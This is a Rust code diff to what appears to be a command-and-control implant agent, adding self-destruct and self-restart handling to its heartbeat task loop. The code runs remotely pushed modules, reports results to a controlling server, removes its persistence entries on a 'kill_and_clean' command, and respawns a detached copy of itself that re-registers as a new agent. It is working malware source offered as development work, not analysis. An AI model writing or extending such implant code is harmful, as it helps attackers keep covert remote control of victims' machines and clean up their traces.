@@ -15,6 +15,18 @@ enum TaskOutcome {
     DoneUnwrapped(String),
     /// Response that gets wrapped in the standard task envelope.
     DoneWrapped(String),
+    /// Self-destruct: remove persistence entries, then exit the process.
+    /// The result is submitted first so the task does not hang as running.
+    Destroy,
+    /// Self-restart: spawn a fresh copy of this binary, then exit the process.
+    Restart,
+}
+
+/// What to do after the task result has been submitted (agent lifecycle ops).
+enum ExitAction {
+    None,
+    Destroy,
+    Restart,
 }
 
 pub(crate) async fn heartbeat_tick(
@@ -40,22 +52,63 @@ pub(crate) async fn heartbeat_tick(
             resolve_task(task, &mut mm).await
         };
 
-        let result = match outcome {
+        let (result, exit_action) = match outcome {
             TaskOutcome::Run { main, input } => {
                 let output = match crate::module_manager::execute_module(main, &input).await {
                     Ok(r) => r,
                     Err(e) => serde_json::json!({ "success": false, "output": e }).to_string(),
                 };
-                wrap_result(&task.id, &output)
+                (wrap_result(&task.id, &output), ExitAction::None)
             }
-            TaskOutcome::DoneUnwrapped(r) => r,
-            TaskOutcome::DoneWrapped(r) => wrap_result(&task.id, &r),
+            TaskOutcome::DoneUnwrapped(r) => (r, ExitAction::None),
+            TaskOutcome::DoneWrapped(r) => (wrap_result(&task.id, &r), ExitAction::None),
+            TaskOutcome::Destroy => (
+                wrap_result(&task.id, r#"{"status":"destroying","op":"kill_and_clean"}"#),
+                ExitAction::Destroy,
+            ),
+            TaskOutcome::Restart => (
+                wrap_result(&task.id, r#"{"status":"restarting"}"#),
+                ExitAction::Restart,
+            ),
         };
 
         eprintln!("[SEND] task_result | id={} | len={}", task.id, result.len());
         let _ = http.submit_result(agent_id, &result, session_key).await;
+
+        // Self-destruct / self-restart happen *after* the result is submitted,
+        // so the server records the task as completed and the agent then exits.
+        match exit_action {
+            ExitAction::Destroy => {
+                eprintln!("[kill_and_clean] removing persistence and exiting");
+                crate::persistence::PersistenceManager::cleanup();
+                std::process::exit(0);
+            }
+            ExitAction::Restart => {
+                eprintln!("[restart] spawning self and exiting");
+                spawn_self();
+                std::process::exit(0);
+            }
+            ExitAction::None => {}
+        }
     }
     Ok(())
+}
+
+/// Spawn a detached copy of the current executable (the agent binary).
+/// The fresh process reads the same injected config from itself, so it
+/// re-registers and resumes heartbeats as a new agent instance.
+fn spawn_self() {
+    let exe = match std::env::current_exe() {
+        Ok(e) => e,
+        Err(e) => {
+            eprintln!("[restart] current_exe failed: {e}");
+            return;
+        }
+    };
+    match std::process::Command::new(&exe).spawn() {
+        Ok(_) => eprintln!("[restart] child spawned: {}", exe.display()),
+        Err(e) => eprintln!("[restart] spawn failed: {e}"),
+    }
 }
 
 fn wrap_result(task_id: &str, output: &str) -> String {
@@ -155,9 +208,10 @@ async fn resolve_task(
             TaskOutcome::DoneWrapped(r#"{"status":"sleeping"}"#.to_string())
         }
         CommandType::KillAndClean => {
-            eprintln!("[kill_and_clean] removing persistence and exiting");
-            crate::persistence::PersistenceManager::cleanup();
-            std::process::exit(0);
+            TaskOutcome::Destroy
+        }
+        CommandType::Restart => {
+            TaskOutcome::Restart
         }
         _ => {
             // Unknown command type — respond with generic ok
